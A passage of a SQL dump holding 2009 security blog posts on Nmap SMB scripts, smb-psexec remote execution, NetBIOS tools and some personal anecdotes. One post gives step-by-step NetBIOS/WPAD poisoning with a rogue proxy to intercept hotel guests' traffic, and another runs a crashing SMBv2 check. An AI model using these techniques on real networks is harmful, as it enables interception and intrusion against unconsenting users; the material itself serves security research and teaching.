then the program won\'t be able to find them), but they will be marked as hidden/system/etc. This may cause a race condition if multiple people are doing this at once, but there isn\'t much we can do. The files are also deleted afterwards as tempfiles would be. The files have to be in the same directory as programs (nselib/data/psexec), but the program doesn\'t necessarily need to be an uploaded one.\ntempfiles (string[]) A list of temporary files that the process is known to create (if the process does create files, using this field is recommended because it helps avoid making a mess on the remote system)\nfind (string[]) Only display lines that contain the given string(s) (for example, if you\'re searching for a line that contains \'IP Address\', set this to {\'IP Address\'}. This allows Lua-style patterns, see:  (don\'t forget to escape special characters with a \'%\'). Note that this is client-side only; the full output is still returned, the rest is removed while displaying. The line of output only needs to match one of the strings given here.\nremove (string[]) Opposite of find; this removes lines containing the given string(s) instead of displaying them. Like find, this is client-side only and uses Lua-style patterns. If \'remove\' and \'find\' are in conflict, the \'remove\' takes priority.\nnoblank (boolean) Setting this to true removes all blank lines from the output.\nreplace (table) A table of values to replace in the strings returned. Like find and replace, this is client-side only and uses Lua-style patterns.\nheadless (boolean) If \'headless\' is set to true, the program doesn\'t return any output; rather, it runs detached from the service so that, when the service ends, the program keeps going. This can be useful for, say, a monitoring program. Or a backdoor, if that\'s what you\'re into (a Metasploit payload should work nicely). Not compatible with: find, remove, noblank, replace, maxtime, outfile.\nenabled (boolean) Set to false, and optionally set disabled_message, if you don\'t want a module to run. Alternatively, you can comment out the process.\ndisabled_message (string) Displayed if the module is disabled.\nurl (string) A module where the user can download the uploadable file. Displayed if the uploadable file is missing.\noutfile (string) If set, the specified file will be returned instead of stdout.\nreq_args (string[]) An array of arguments that the user must set in --script-args.\n\nAs you can see, there are a ton of options. Check out my default scripts for more ideas/examples!', '\'Hacking\', \'NetBIOS/SMB\', \'Nmap\'', 'https://blog.skullsecurity.org/2009/smb-psexec-nse-owning-windows-fast-part-2');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (88, 'smb-psexec.nse: owning Windows, fast (Part 1)', 'Ron Bowes', '2009-12-14', 'Posts in this series (I\'ll add links as they\'re written):\n\nWhat does smb-psexec do?\nSample configurations (\"sample.lua\")\nDefault configuration (\"default.lua\")\nAdvanced configuration (\"pwdump.lua\" and \"backdoor.lua\")\n\n\nGetting started\nIf any of you saw my Toorcon talk (and if you did, please post a comment or email me -- I\'d love to know if those cards I printed were actually worthwhile), you saw me go ontalk a bit about my smb-psexec.nse script (source) for Nmap. It\'s a fairly new script, but as I use it and play with it, I\'m getting more confident in its usefulness/stability. I like it enough that I intend to do a series of posts on it, so check back soon!\nSo anyway, let\'s start off simple. Today\'s post will be, what does smb-psexec.nse do?\nWhat does it do?\nWell, simply enough, it runs programs somewhere else. Specfically, on a remote Windows machine. It uses the same concepts as Microsoft Sysinternals\' psexec tool, which does essentially the same thing (but in a more limited sense). It also uses the same techniques as the Metasploit Framework\'s psexec module. These tools are great, and do the job perfectly, so why did I bother writing my own?\nWhy should I care?\nI\'ll get deeper into some of these points in later blog postings, but for now here\'s a quick list::\n\nMulti-platform -- smb-psexec.nse, including its required SMB/MSRPC libraries, is implemented from scratch in Lua, and therefore can run on any operating system that Nmap runs on. That means it\'ll run on nearly ever platform, including Linux, Windows, BSD, OSX, etc.\nMultiple executables -- While other tools are designed to run a single remote service, smb-psexec, is designed to run any number of executables in a single execution.\nMultiple targets -- Nmap\'s scanning capabilities are leveraged here; with Nmap scanning, a wide range of hosts is as easy as scanning a single host.\nLocal or remote executables -- The executable files can be stored locally on the attacker system (say, fgdump.exe) or can already be on the target system (say, ping.exe or tracert.exe). \nConfiguration-based -- Each scan uses a configuration file to set its options. As a result, scans are easily configurable and repeatable.\nOutput formatting -- The configuration files make it easy to format the output from each remote process, allowing you to filter out excess output.\n\nThe biggest downside with smb-psexec.nse is the loss of interactivity. Because Nmap is written as a scanner, and these scripts are run in parallel, there is no opportunity for user input. But we aren\'t focusing on the bad stuff today! \nWhat do you need?\nSo, that\'s what the script does. Now, before you can run it, what do you need? You\'ll need the following:\n\nAdministrator account on the remote system\nTCP port 139 or 445 open on the remote system\nThe ability to create services on the remote system\n\nAdmin account\nSo, the first requirement is easy. You need an administrator account to run services on the machine. Thank $favourite_deity for that; if anybody could run a process on any machine, things would be a lot easier for the bad guys. \nThe most obvious way to provide credentials is to pass them on the commandline:\nnmap -p139,445 --script=smb-psexec --script-args=smbuser=ron,smbpass=Password1 <target>\nBut, if you either don\'t know the username/password, or you have many machines with different accounts, you can combine smb-psexec.nse with smb-brute.nse:\nnmap -p139,445 --script=smb-brute,smb-psexec <target>\nObviously, when you\'re performing a bruteforce, there\'s the possibility of locking out accounts. For that reason, only do that on machine(s) that either you own, or you know the policies on!\nPorts\nThe second requirement is that TCP port 139 or 445 has to be open. These ports are functionally equivalent for our purposes, so it doesn\'t matter which one is open; TCP/445 is raw SMB, and TCP/139 is SMB over NetBIOS -- Nmap will autodetect and function accordingly. For what it\'s worth, TCP/445 is preferred because it has less overhead.\nAnyway, as I\'m sure you all know, modern versions of Windows (Windows XP SP2, Windows 2003 SP1, Windows Vista, etc) enable the Windows firewall by default. Likewise, many organizations have software firewalls, hardware firewalls, or both. These will obviously block your SMB traffic, and rightly so. Would you want an external entity running smb-psexec.nse?\nSo, if you\'re going to run smb-psexec.nse, double check that those ports are open. \nService creation\nThe final requirement is the ability to create services on the remote system. It sounds simple, but the problem is twofold. The first problem is, the appropriate services have to be enabled; starting with Vista, they\'re disabled by default. From a quick look, I didn\'t find the specific services, but there is a generic way to enable them. See the link at the bottom of this section. \nThe second problem is that User Account Control (UAC) has to be turned off. Starting on Vista, administrators are treated as ordinary users as long as UAC is enabled. In an odd way this makes sense because the point of UAC is that Windows refuses to grant elevated privileges to any accounts without a user explicitly allowing it. \nIf you want to run smb-psexec.nse against a modern Windows version, here\'s a guide for setting it up.\nRunning this script from Windows\nIt came to my attention this weekend that, up to and including Nmap 5.10BETA1, the Windows version of Nmap is missing some of the required files for smb-psexec.nse to run. Your best bet is to download the Linux version found here, grab the folder nselib/data/psexec, and place it in c:\\program files\\Nmap\\nselib\\data. This will be resolved in any version newer than 5.10BETA1. \nConclusion\nSo, that\'s what the smb-psexec.nse script does. Check back soon for new posts!', '\'Hacking\', \'NetBIOS/SMB\', \'Nmap\'', 'https://blog.skullsecurity.org/2009/smb-psexec-nse-owning-windows-fast-part-1');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (89, 'Pwning hotel guests', 'Ron Bowes', '2009-11-19', 'Greetings everybody! \nI spent a good part of the past month traveling, which meant staying in several hotels, both planned and unplanned. There\'s nothing like having a canceled flight and spending a boring night in San Francisco! But hey, why be bored when you have a packet sniffer installed? :)\n\nDisclaimer: running a sniffer on somebody else\'s network may or may not be illegal; the only advice I can give is the guy down at Kinko\'s said it\'s okay. \nNow, before I get to the fun, we need to step back and talk about NetBIOS name resolution a bit. My very first post on this blog was actually about NetBIOS and my NBTool suite, and you may want to review it because this\'ll be a quick crash course. \nNetBIOS review\nWhen Windows attempts to resolve domain names, it uses to DNS first. Assuming nobody has hijacked their DHCP request and fed them bad DNS servers, and nobody is performing ARP spoofing to redirect traffic, it\'ll go out to their DNS server. The DNS server, assuming it hasn\'t been poisoned or hijacked, will respond with the proper IP address. (It\'s a miracle anybody gets work done on the Internet, isn\'t it?)\nIf DNS fails, Windows tries NetBIOS name resolution. It\'s this resolution that lets you type \"ping FREDSBOX\" and, if FREDSBOX is alive, it\'ll resolve. While useful on a trusted network (haha, trusted network...), this resolution really just amounts to a broadcast saying \"Who has XXX?\" The thoughtful servers on the network, unless they\'re legitimately named \"XXX\", look down and shuffle their feet, and the server named \"XXX\" will say \"hey, that\'s me!\" But what\'s stopping an attacker from also claiming to be \"XXX\"? \nNothing. \nThat\'s why, in a fateful moment of usefulness, I wrote NBTool. \nNBTool?\nOne of the tools included with NBTool, called nbpoison, will intercept requests and respond with a requested address. With the -c (or conflict) flag, it\'ll even inform other servers that they don\'t own a name. That might cause services to break, though, and some versions of Windows will pop up a warning when a conflict occurs. But such is life. \nWhen you supply -c, you end up with traffic that looks like:\n\nFREDSBOX: (having just booted) Hey guys, just FYI, I\'m FREDSBOX\nAttacker: No, sir, you are not; I am FREDSBOX\nFREDSBOX: k, sorry (from then on, FREDSBOX won\'t respond to his own name)\n\nSo anyway, I wrote that awhile ago, and had some fun showing off to our co-op students (\"look! going to \'www.yahoo.colm\' takes you to Google! Isn\'t that funny?\" (their answer was inevitably \"no\")), but then I shelved it to work on things people actually care about. (Note that \'www.yahoo.com\' is intentionally misspelled -- the reason is that, if it\'s spelled correctly, the NetBIOS request would never be made). \nWhat I hadn\'t realized was, there are more fun things you can do! Let\'s have a look. \nWhere\'d that WPAD server go...?\nOne of the first things I noticed after running a packet capture in a hotel was this:\n\nI saw some workstations desperately trying to find a server called WPAD, and I couldn\'t get over how familiar WPAD looked. Word Press [something]? [something] Active Directory? Is it a blog thing? Bah!\nSo, I looked it up on the Old Farmers Wikipedia, and found it: Web Proxy Auto Discovery. Of course! This must be somebody\'s browser trying to find a proxy server. Wait... somebody\'s browser is broadcasting a request for a proxy server? And it\'s willing to trust people to tell it which proxy to use? Awesome! \nNow, this is where I stopped. Despite what the guy at Kinko\'s said, I\'m not comfortable with actually redirecting people\'s traffic. That wouldn\'t be nice at all, and I\'m reasonably sure it steps over that legal line. But, here\'s what one could do...\nStep 1: Set up a logging proxy\nBurp Suite and Paros, among others, would work great. It\'s especially fun because they\'ll decrypt SSL for you, and even let you modify requests/responses!\nStep 2: Set up a Web server\nSet up a Web server (or a netcat listener) that\'ll serve up a /wpad.dat file pointing to your logging proxy. I\'m no expert on writing WPAD files, but I found this one online:\nfunction FindProxyForURL(url, host)\r\n{\r\n  return \"PROXY 192.168.100.123:8080\";\r\n}\nStep 3: Start poisoning requests\n$ wget http://www.skullsecurity.org/downloads/nbtool-0.02.tar.gz\r\n$ tar -xvvzf nbtool-0.02.tar.gz\r\n$ cd nbtool-0.02\r\n$ make\r\n$ sudo ./nbpoison -s 192.168.100.123\n(nbpoison has to run as root because it listens on UDP port 137)\nAs of the current version, there\'s no way to actually pick and choose domains; it\'s all or nothing. So, every NetBIOS request will evoke a response. That can be fun, of course, but at some point I\'ll add a domain name argument. \nStep 4: Watch the traffic\nIf all goes according to plan, anybody set to use auto-configured proxies will start using your proxy, and you can see what they\'re up to. And great times will be had by all!\nOther attacks\nHijacking the WPAD file is cool, but what else can you do?\nWell, it turns out that any internal server that the computers are configured to use will send out NetBIOS requests, because, for obvious reasons, their internal servers aren\'t listed in DNS. That can include, but isn\'t limited to:\n\nExchange (or other email) server\nFile shares\nInstant messenger servers\nProxy server\nBrowser\'s homepage\nTime reporting\nIssue tracking\nInternal news feeds\nDevelopment server\netc.\n\nIf you start hijacking names and hosting Web servers, SMB servers, etc, you may start seeing interesting requests. You\'ll want to run Wireshark, as well, to see what else is trying to connect to you. It\'ll be a party!\nSo, what\'s the big deal?\nYes, this is the key. What IS the big deal? So you can redirect somebody who\'s on the same subnet as you. Why not use ARP spoofing? DHCP poisoning? Other subnet-based attacks?\nAnd that\'d be a great question. This is yet another member of a long line of evil things you can do on a subnet. Not to mention scores of attacks against unsecured wireless, which hotels seem to like! \nThe biggest advantage I see is that this attack is fairly quiet, keeping a very low profile. Somebody who isn\'t performing NetBIOS resolutions won\'t even know that somebody\'s out there, and somebody who is will probably get expected error pages when they DO attempt a request. Additionally, when it comes right down to it, there\'s a much smaller chance of screwing things up with NetBIOS poisoning than other LAN attacks. \nThanks for reading!', '\'Hacking\', \'NetBIOS/SMB\', \'Tools\'', 'https://blog.skullsecurity.org/2009/pwning-hotel-guests');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (90, 'Toorcon Slides', 'Ron Bowes', '2009-10-27', 'Hey all,\nThanks for everybody who came out to my Toorcon talk! I had a great weekend, even the part where I got stuck in San Fransisco and spent two full days getting home. Oops :)\nA couple people asked me if I\'d put up my slides, so here you go:\nhttp://svn.skullsecurity.org:81/ron/security/2009-10-toorcon/2009-10%20Toorcon.pdf\n(If you want the original OpenOffice format, directory listings are enabled on that server)\nThanks once again, and it was great to meet all of you!', '\'Conferences\'', 'https://blog.skullsecurity.org/2009/toorcon-slides');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (91, 'Nmap script: enumerating iSCSI devices', 'Ron Bowes', '2009-10-10', 'This is just a quick shout out to Michel Chamberland over at the SecurityWire blog. He wrote a Script to enumerate iSCSI Targets. Unfortunately, I don\'t have any iSCSI to test on, but if you do he\'d love to hear from you!\nRon', '\'Nmap\'', 'https://blog.skullsecurity.org/2009/nmap-script-enumerating-iscsi-devices');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (92, 'Toorcon coming up!', 'Ron Bowes', '2009-10-9', 'Hey all,\nI\'ll be presenting at Toorcon San Diego in a couple week (finalized lineup, my talk!).\n\nAs a bonus, I got business cards that say \"SkullSecurity.org\" printed out this week. They\'re really nice, and I\'m hoping to give them out. If you\'ll be at Toorcon, come find me and I\'ll give you one (provided I don\'t give them all out in the next two weeks :) ). \nLooking forward to seeing some of you there!\nRon', '\'Conferences\', \'Hacking\'', 'https://blog.skullsecurity.org/2009/toorcon-coming-up');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (93, 'Updated: Scanning for Microsoft FTP with Nmap', 'Ron Bowes', '2009-9-17', 'Hi all,\nI wrote a blog last week about scanning for Microsoft FTP with Nmap. In some situations the script I linked to wouldn\'t work, so I gave it an overhaul and it should work nicely now.\n\nI renamed the script to ftp-capabilities.nse. You can get the new version from svn with the usual commands:\n\r\n$ svn co --username guest --password \'\' svn://svn.insecure.org/nmap\r\n$ cd nmap\r\n$ ./configure && make\r\n# make install\r\n$ nmap -d -p21 --script=ftp-capabilities \r\n\nOr you can download the current version (as of September 17, 2009) at http://www.skullsecurity.org/blogdata/ftp-capabilities.nse (note that that version won\'t be updated). \nThe output will simply tell you whether or not it\'s Windows FTP, and whether or not MKDIR is permitted. It doesn\'t tell you \"vulnerable\" or \"not vulnerable\", because it isn\'t actually checking for an exploit. Of course, if you let anonymous call MKDIR, you probably have other issues. :)\nHappy scanning!\nRon', '\'Nmap\', \'Tools\'', 'https://blog.skullsecurity.org/2009/updated-scanning-for-microsoft-ftp-with-nmap');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (94, 'Zombie Web servers: are you one?', 'Ron Bowes', '2009-9-16', 'Greetings! \nI found this excellent writeup of a Web-server botnet on Slashdot this weekend. Since it sounded like just the thing for Nmap to detect, I wrote a quick script!\n\nFirst, the attacker somehow compromises an innocent Web server (presumably via weak passwords or a similar mechanism). After the compromise, an additional Web server is started on port 8080. This server, however is malicious; it will try and exploit vulnerable browsers with typical drive-by downloads. If a non-vulnerable browser connects to it, instead of serving the malware the server redirects them (via the \"302 Found\" status) to another infected Web server which attempts to do the same. \nThis redirection is easy to detect with Nmap. \nThe script is called http-malware-host.nse, and I highly recommend running it against your own servers. All you need to do is check it out from svn and run it:\n\r\n$ svn co --username guest --password \'\' svn://svn.insecure.org/nmap\r\n$ cd nmap\r\n$ ./configure && make\r\n# make install\r\n$ nmap -d -p80,443,8080 --script=http-malware-host <target>\r\n\nIf the host is clean, you will see no additional output. If the host is infected, you\'ll see the following:\n$ ./nmap -p8080 --script=http-malware-host last-another-life.ru                                                                                                                                                                                                            Starting Nmap 5.05BETA1 ( http://nmap.org ) at 2009-09-16 09:32 CDT\r\nWarning: Hostname last-another-life.ru resolves to 5 IPs. Using 80.69.74.73.\r\nNSE: Script Scanning completed.\r\nInteresting ports on 80-69-74-73.colo.transip.net (80.69.74.73):\r\nPORT     STATE SERVICE\r\n8080/tcp open  http-proxy\r\n|  http-malware-host: Host appears to be infected (/ts/in.cgi?open2 redirects \r\nto http://last-another-life.ru:8080/index.php)\r\n|_ See: http://blog.unmaskparasites.com/2009/09/11/dynamic-dns-and-botnet-\r\nof-zombie-web-servers/\r\n\nI highly recommend double-checking your servers for this infection! \n<UPDATE> You can download the current version of the scrit (as of Sept 17, 2009) here. That version won\'t be kept up to date, though.', '\'Malware\', \'Nmap\', \'Tools\'', 'https://blog.skullsecurity.org/2009/zombie-web-servers-are-you-one');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (95, 'Scorched earth: Finding vulnerable SMBv2 systems with Nmap', 'Ron Bowes', '2009-9-14', 'Hello once again! \nI just finished updating my smb-check-vulns.nse Nmap script to check for the recent SMBv2 vulnerability, which had a proof-of-concept posted on full-disclosure. \nWARNING: This script will cause vulnerable systems to bluescreen and restart. Do NOT run this in a production environment, unless you like angry phonecalls. You have been warned!\n\nWith that out of the way, let\'s look at how to run the script! The easiest way is to check out Nmap\'s SVN version and run it from there:\n\r\n$ svn co --username guest --password \'\' svn://svn.insecure.org/nmap\r\n$ cd nmap\r\n$ ./configure && make\r\n# make install\r\n$ nmap -d -p445 --script=smb-check-vulns --script-args=unsafe=1 <target>\r\n\nAlternatively, you can skip the \"make install\" and run it from the current directory. Just run \"export NMAPDIR=.\" first. \nNote the \"script-args\" parameter -- due to the nature of these tests, I opted to require the user to explicitly enable unsafe checks. This may go away in the future, after discussion, but adding it won\'t hurt. \nYou should see something like this for a vulnerable server (a lot more if you give -d):\n\r\n$ ./nmap -p445 --script=smb-check-vulns --script-args=unsafe=1 10.x.x.x\r\n\r\nStarting Nmap 5.05BETA1 ( http://nmap.org ) at 2009-09-14 10:39 CDT\r\nNSE: Script Scanning completed.\r\nInteresting ports on 10.x.x.x:\r\nPORT    STATE SERVICE\r\n445/tcp open  microsoft-ds\r\n\r\nHost script results:\r\n|  smb-check-vulns:\r\n|  Conficker: Likely CLEAN; access was denied.\r\n|  |  If you have a login, try using --script-args=smbuser=xxx,smbpass=yyy\r\n|  |  (replace xxx and yyy with your username and password). Also try\r\n|  |_ smbdomain=zzz if you know the domain. (Error NT_STATUS_ACCESS_DENIED)\r\n|_ SMBv2 DoS (CVE-2009-3103): VULNERABLE\r\n\nAnd that\'s it! \nIf you want more details about this vulnerability, this VRT Blog post has a great discussion about what\'s going on behind the scenes.', '\'NetBIOS/SMB\', \'Nmap\', \'Tools\'', 'https://blog.skullsecurity.org/2009/scorched-earth-finding-vulnerable-smbv2-systems-with-nmap');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (96, 'Random picture: Traffic control box', 'Ron Bowes', '2009-9-4', 'I was going to do a post about Nmap today, but since their svn is having some issues, you\'re going to get something a little more fun (in my opinion)! \nMy friend snapped this picture in Vancouver, BC near Stanley Park (the picture is geocoded, so check out the Exif data if you want to know exactly where). \nClick for a bigger version.', '\'Random picture\'', 'https://blog.skullsecurity.org/2009/random-picture-traffic-control-box');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (97, 'Scanning for Microsoft FTP with Nmap', 'Ron Bowes', '2009-9-2', 'Hi all,\nIt\'s been awhile since my last post, but don\'t worry! I have a few lined up, particularly about scanning HTTP servers with Nmap. More on that soon! \nIn the meantime, I wanted to direct your attention to This post (update here) about finding potentially vulnerable Microsoft FTP servers.\n\nThis is, of course, related to the currently unpatched vulnerability in Microsoft FTP. \nWhile this is great advice, and a useful script, we\'ve taken the opportunity to put a scorched earth policy in place: tracking down every FTP server (especially Microsoft ones), and decide if they\'re needed. In many cases, I expect we\'re going to discover that somebody enabled FTP a long time ago, and never disabled it. \nI asked one of my minions to come up with an Nmap command to find all FTP servers, and this seems to be working nicely:\n./nmap -T4 -PS21 -p21 -O --max-rtt-timeout 200 --initial-rtt-timeout 150 \\\r\n--min-hostgroup 100 -oG /tmp/WindowsFTP.grep -iL ../WindowsServers24\nIf anybody has any better commands, we\'d love to hear it!', '\'Nmap\', \'Tools\'', 'https://blog.skullsecurity.org/2009/scanning-for-microsoft-ftp-with-nmap');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (98, 'Nmap 5.00 released — lots of new features!', 'Ron Bowes', '2009-7-16', 'View my post on Slashdot\nI\'m just going to quote my Slashdot post inline.. check out the links for all the nitty gritty details. The bottom line is that 5.00 is awesome, and includes everything I\'ve written as yet -- download it! :)\n\n--\nThe long-awaited Nmap Security Scanner version 5.00 was just released (download)! This marks the most important release since 1997, and is a huge step in Nmap\'s evolution from a simple port scanner to an all-around security and networking tool suite. Significant performance improvements were made, and dozens of scripts were added. For example, Nmap can now log into Windows and perform local checks (PDF), including Conficker detection. New tools included in 5.00 are Ncat, a modern reimplementation of Netcat (with IPv6, SSL, NAT traversal, port redirection, and more!), and Ndiff, for quickly comparing scan results. Other tools are in the works for future releases, but we\'re still waiting for them to add email and ftp clients so we can finally get off Emacs!', '\'Hacking\', \'Tools\'', 'https://blog.skullsecurity.org/2009/nmap-500-released-lots-of-new-features');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (99, 'Two locks, one bike?', 'Ron Bowes', '2009-7-12', 'Hi all,\nI had the weirdest thing happen to me today, and I couldn\'t resist sharing it. If you\'re looking for security tips or tricks, move along. If you want a funny story (that sort of involves security), stick around!\n\nSo, I needed some odds and ends today. Since it\'s right down the street, I rode my bike down to Zellers (a Canadian chain owned by the Hudson Bay Company). I left my good bikelock at my dad\'s place, so I brought my crappy lock, and therefore my crappy bike (I left the good bike at home). \nI do my shopping, leave the store, and go to unlock my bike. But wait, there\'s a problem. Can you see what\'s wrong here? Hint: my bike is the black one on the left.\n\nOf course you can\'t, because I suck at photography (the little camera on my Android phone doesn\'t help, either). But I\'ll give you a hint: my U-lock was at my dad\'s place. \"But there\'s a U-lock ON the bike!\" you\'re thinking. There sure is! Apparently, somebody put their lock on my bike. Who? Didn\'t know. Why? I wished I knew.\n\n\nMy gut reaction, of course, was to take a picture. Document the evidence. This could, after all, make a good story! After that, I called my dad to see if he could bring down his Sawzall to cut the other lock off my bike, but he was busy. I toyed with the idea of either:\na) picking the lock (my picks are always in my backpack); or\nb) filling the lock with Krazy glue (which I also had in my backpack)\nNeither option seemed like it\'d help much (I don\'t know how to pick that type of lock, and I didn\'t want to destroy somebody else\'s lock). \nAnyways, I eventually went back into the store and got a security guard to come out with me. He was equally puzzled, until we noticed...\n\nThat\'s right! The bike next to mine was entirely unlocked! Not to mention it\'s a way nicer bike than mine. Clearly, somebody had accidentally locked my bike instead of theirs! Won\'t they find it funny when they come out and I tell them what happened. We\'ll share a good laugh together! Ha ha! \nSo, the security guard went inside and made an announcement. I patiently sat in the sun with my groceries, waiting for the owner to show up red faced to admid their mistake. No dice. \nAfter about 20 minutes of sitting there, a lady finally walks out. She walks up to the unlocked bike, and I approach. Unfortunately, I didn\'t have the foresight to turn on my Android phone\'s voice recorder, but our conversation went something like this:\n-----------------\nMe: Is this blue bike yours?\nHer: Yes.\nMe: Well, it looks like you locked the wrong bike. Ha ha?\nHer: No I didn\'t.\n-----------------\nHang on a sec. \"No I didn\'t?\" -- is she seriously going to deny this?\n-----------------\nMe: Is that your lock?\nHer: [no answer]\nMe: It\'s on my bike.\nHer: I didn\'t lock THAT bike, it already HAS a lock!\nMe: I know. That\'s MY lock.\n-----------------\nAt this point, she\'s getting really irritable. At the very most, I thought she\'d be embarrassed. Or even angry. But to completely deny it when the evidence is right in front of her face? Seriously?\n-----------------\nMe: Can you just unlock my bike?\nHer: You\'re going to have to wait while I find the key. *starts rummaging through her backpack*\nMe: That\'s fine, I\'ve already waited here long enough.\n-----------------\nWith that, she gets her key out, unlocks my bike, and takes off. While she\'s doing it, of course, I\'m snapping pictures:\n\n\nAnd without another word, she rides off into the sunset.....\n\nThe whole time we were talking, all I could think of was that I couldn\'t wait to tell everybody about this. :)', '\'Humour\'', 'https://blog.skullsecurity.org/2009/two-locks-one-bike');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (100, 'My SANS Gold Paper: Nmap SMB Scripts', 'Ron Bowes', '2009-6-22', 'Hey all,\nFor my SANS GPEN Gold certification (first Gold-certified analyst for GPEN -- go me!) I wrote a paper on my SMB scripts for Nmap. The paper is titled \"Scanning Windows Deeper With the Nmap Scanning Engine\". I started writing it a few months ago, and collaborated with Fyodor in the early stages. Hopefully it\'s a useful guide!\nI talk a bit about the theory and protocols behind the scripts, then dive into a few of the more interesting ones and talk about how they work and how they can be used. \nLet me know what you think!', '\'NetBIOS/SMB\'', 'https://blog.skullsecurity.org/2009/my-sans-gold-paper-nmap-smb-scripts');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (101, 'nbstat.nse: just like nbtscan', 'Ron Bowes', '2009-6-9', 'Hey all,\nWith the upcoming release of Nmap 4.85, Brandon Enright posted some comments on random Nmap thoughts. One of the things he pointed out was that people hadn\'t heard of nbstat.nse! Since I love showing off what I write, this blog was in order.\n\nHow do I scan a single host?\nSimply initiate an Nmap scan against a Windows or Samba target, and either run the \'default\' scripts or specifically nbstat.nse. For example:\nnmap --script=nbstat <target>\r\nor\r\nnmap --script=default <target>\nThe result is simple to interpret:\n|_ nbstat: NetBIOS name: BASEWIN2K3, NetBIOS user: , NetBIOS MAC: 00:0c:29:03:8f:64\nThis will run against any system that has Windows or Samba ports open (tcp/139 or tcp/445). \nThe NetBOIS name in the result is, obviously, the name given to the target machine. The NetBIOS user is the name of the user who\'s logged into the target\'s console, if it\'s returned (frequently, it isn\'t). And finally, if the MAC address is given by the host (it\'s always given on Windows, never on Samba), it\'s displayed. \nThis is a very quick check (a single UDP packet) and gives a decent amount of information about the host. For more information, check out the page for the very nice nbtscan tool. \nHow to scan a large network\nThanks to Brandon Enright for providing this! It\'s a fast way to scan your network for Windows hosts, and run nbscan against them (note: requires a good connection, and requires Windows hosts to have port 445 open):\nsudo nmap -T5 -PN -p 445 -sS -n --min-hostgroup 8192 --min-rtt-timeout 1000 \\\r\n--min-parallelism 4096 --script=nbstat <target>\r\n\nThis scan took about 2 minutes on a /16 when Brandon tried. \nHow does it work?\nTalking about how my scripts work... always my favourite part! But prepare for some technical details...\nThe easy answer is this: nbstat.nse sends a request to a Windows machine on port 137. It\'s a static request and can be hardcoded. The server responds with its name, MAC address, and other details. \nRequest\nThe header of the packet looks like this:\n\r\n  --------------------------------------------------\r\n  |  15 14 13 12 11 10 9  8  7  6  5  4  3  2  1  0 |\r\n  |                  NAME_TRN_ID                    |\r\n  | R |   OPCODE  |      NM_FLAGS      |   RCODE    | (FLAGS)\r\n  |                    QDCOUNT                      |\r\n  |                    ANCOUNT                      |\r\n  |                    NSCOUNT                      |\r\n  |                    ARCOUNT                      |\r\n  --------------------------------------------------\r\n\nThe TRN_ID, or transaction ID, is a random 2-byte value that identifies a request or response. In nbstat.nse, I use 0x1337. \nFor our purposes, the flags and COUNT fields, except QDCOUNT, are unnecessary and set to 0. QDCOUNT refers to the number of questions we\'re asking the host. Since we\'re asking only a single question (\"who are you?\"), this is set to 1. \nWhen all\'s said and done, this is our encoded header:\n13 37 00 00 00 01 00 00 00 00 00 00\nThe body of the packet is a list of names to check for in the following format:\n\n(string) encoded name\n(2 bytes)  query type (0x0021 = NBSTAT)\n(2 bytes)  query class (0x0001 = IN)\n\nThe encoded name is the name we\'re looking up -- \'*\' in our case (matches any name). It\'s encoded through a somewhat complicated function that changes any arbitrary binary data to a string of uppercase characters preceded by a length byte (check out \'netbios.lua\' in \'nselib\', included with Nmap, if you\'re interested). The string \'*\' translates to \' CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\' (the initial space is 0x20, or 32 -- the length of the encoded string). \nThe query type and query class are constant values. The final body is:\n 20 43 4b 41 41 41 41 41 41 41 41 41 41 41 41 41 \r\n 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 \r\n 41 00 00 21 00 01\nThe full packet is this:\n00000000 13 37 00 00 00 01 00 00 00 00 00 00 20 43 4b 41    .7.......... CKA\r\n00000010 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA\r\n00000020 41 41 41 41 41 41 41 41 41 41 41 41 41 00 00 21    AAAAAAAAAAAAA..!\r\n00000030 00 01                                              ..\nFor fun, you can send this string with netcat to any system listening on 137, and you\'ll probably get a good response:\necho -ne \"\\x13\\x37\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x43\\x4b\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x00\\x00\\x21\\x00\\x01\" | nc -u 192.168.200.128 137 | hexdump -C\r\n00000000  13 37 84 00 00 00 00 01  00 00 00 00 20 43 4b 41  |.7.......... CKA|\r\n00000010  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|\r\n00000020  41 41 41 41 41 41 41 41  41 41 41 41 41 00 00 21  |AAAAAAAAAAAAA..!|\r\n00000030  00 01 00 00 00 00 00 9b  06 42 41 53 45 57 49 4e  |.........BASEWIN|\r\n00000040  32 4b 33 20 20 20 20 20  00 04 00 42 41 53 45 57  |2K3     ...BASEW|\r\n00000050  49 4e 32 4b 33 20 20 20  20 20 20 04 00 57 4f 52  |IN2K3      ..WOR|\r\n00000060  4b 47 52 4f 55 50 20 20  20 20 20 20 00 84 00 